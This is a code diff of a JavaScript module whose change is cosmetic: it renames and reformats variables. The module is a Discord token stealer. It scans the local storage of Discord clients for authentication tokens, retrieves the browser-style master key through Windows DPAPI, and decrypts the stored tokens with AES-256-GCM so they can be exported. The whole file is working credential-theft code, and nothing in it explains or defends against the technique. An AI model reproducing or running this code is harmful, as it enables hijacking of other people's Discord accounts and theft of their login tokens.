@@ -3,7 +3,7 @@ const crypto = require("crypto");
 const path = require("path");
 const aura = require("win-dpapi");
 
-let totalsTokens = [];
+let ALL_TOKENS = [];
 
 const cords = [
     "discord",
@@ -13,7 +13,7 @@ const cords = [
     "lightcord",
 ];
 
-async function find(p) {
+async function FIND_TOKENS(p) {
     const tail = p;
     p = path.join(p, "Local Storage/leveldb");
 
@@ -22,8 +22,8 @@ async function find(p) {
             const files = await fs.promises.readdir(p);
             
             for (const file of files) {
-                const filePath = path.join(p, file);
-                const fileContent = await fs.promises.readFile(filePath, "utf8");
+                const FILE_P = path.join(p, file);
+                const FILE_C = await fs.promises.readFile(FILE_P, "utf8");
 
                 const regexs = [
                     /mfa\.[\w-]{84}/g,
@@ -32,79 +32,56 @@ async function find(p) {
                 ];
 
                 regexs.forEach((r) => {
-                    const foundTokens = fileContent.match(r);
-                    if (foundTokens) {
-                        foundTokens.forEach((tkn) => {
-                            if (!totalsTokens.includes(tkn)) totalsTokens.push(tkn);
+                    const FOUND_TOKENS = FILE_C.match(r);
+                    if (FOUND_TOKENS) {
+                        FOUND_TOKENS.forEach((tkn) => {
+                            if (!ALL_TOKENS.includes(tkn)) ALL_TOKENS.push(tkn);
                         });
                     }
                 });
             }
-        } catch (err) { }
-        return totalsTokens;
+        } catch (e) { }
+        return ALL_TOKENS;
     } else {
-        const localStatePath = path.join(tail, "Local State");
-        if (fs.existsSync(localStatePath)) {
+        const LOCAL_STATE_PATH = path.join(tail, "Local State");
+        if (fs.existsSync(LOCAL_STATE_PATH)) {
             try {
                 fs.readdirSync(p).forEach((f) => {
                     if (f.endsWith(".log") || f.endsWith(".ldb")) {
-                        const lines = fs
-                            .readFileSync(path.join(p, f), "utf8")
-                            .split(/\r?\n/);
+                        fs.readFileSync(path.join(p, f), "utf8").split(/\r?\n/).forEach((l) => {
+                            const FOUND_TOKENS = l.match(/dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*/g);
 
-                        lines.forEach((l) => {
-                            const pattern = /dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*/g;
-                            const foundTokens = l.match(pattern);
-
-                            if (foundTokens) {
-                                foundTokens.forEach((tkn) => {
-                                    const enc = Buffer.from(
-                                        JSON.parse(fs.readFileSync(localStatePath)).os_crypt
-                                            .encrypted_key,
-                                        "base64",
-                                    ).slice(5);
-
-                                    const key = aura.unprotectData(
-                                        Buffer.from(enc, "utf-8"),
-                                        null,
-                                        "CurrentUser",
-                                    );
-
-                                    const tkns = Buffer.from(
-                                        tkn.split("dQw4w9WgXcQ:")[1],
-                                        "base64",
-                                    );
+                            if (FOUND_TOKENS) {
+                                FOUND_TOKENS.forEach((tkn) => {
+                                    
+                                    const enc = Buffer.from(JSON.parse(fs.readFileSync(LOCAL_STATE_PATH)).os_crypt.encrypted_key,"base64").slice(5);
+                                    const key = aura.unprotectData(Buffer.from(enc, "utf-8"), null, "CurrentUser");
+                                    const tkns = Buffer.from(tkn.split("dQw4w9WgXcQ:")[1], "base64");
 
                                     const run = tkns.slice(3, 15);
                                     const mid = tkns.slice(15, tkns.length - 16);
 
-                                    const decyph = crypto.createDecipheriv(
-                                        "aes-256-gcm",
-                                        key,
-                                        run,
-                                    );
+                                    const decyph = crypto.createDecipheriv("aes-256-gcm", key, run);
 
                                     decyph.setAuthTag(tkns.slice(tkns.length - 16, tkns.length));
 
-                                    const out =
-                                        decyph.update(mid, "base64", "utf-8") +
-                                        decyph.final("utf-8");
+                                    const out = decyph.update(mid, "base64", "utf-8") + decyph.final("utf-8");
 
-                                    if (!totalsTokens.includes(out)) {
-                                        totalsTokens.push(out);
+                                    if (!ALL_TOKENS.includes(out)) {
+                                        ALL_TOKENS.push(out);
                                     }
                                 });
                             }
                         });
                     }
                 });
-            } catch (err) { }
-            return totalsTokens;
+            } catch (e) { }
+            return ALL_TOKENS;
         }
     }
 }
 
 module.exports = {
-    find,
-    totalsTokens,
+    FIND_TOKENS,
+    ALL_TOKENS,
 };
